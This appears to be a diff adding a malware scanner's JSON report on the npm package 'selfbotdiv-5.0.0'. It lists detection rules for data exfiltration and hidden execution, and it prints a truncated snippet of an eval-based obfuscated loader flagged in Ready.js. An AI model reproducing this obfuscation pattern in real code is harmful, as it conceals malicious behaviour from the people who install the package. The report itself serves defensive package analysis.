@@ -1,0 +1,22 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": {},
+        "npm-obfuscation": [
+            {
+                "location": "package/src/client/actions/Ready.js:1",
+                "code": "let Rv11;!function(){const odZA=Array.prototype.slice.call(arguments);return eval(\"(function wFqp(fVxh){const HsAh=r2Ef(fVxh,ziqh(wFqp.toString()));try{let bQsh=eval(HsAh);return bQsh.apply(null,odZA);}catch(Dnvh){var XKnh=(0o205062-68117);...SI,wNz,YOC",
+                "message": "This package is using a common obfuscation method often used by malware"
+            }
+        ],
+        "shady-links": {},
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/selfbotdiv-5.0.0"
+}
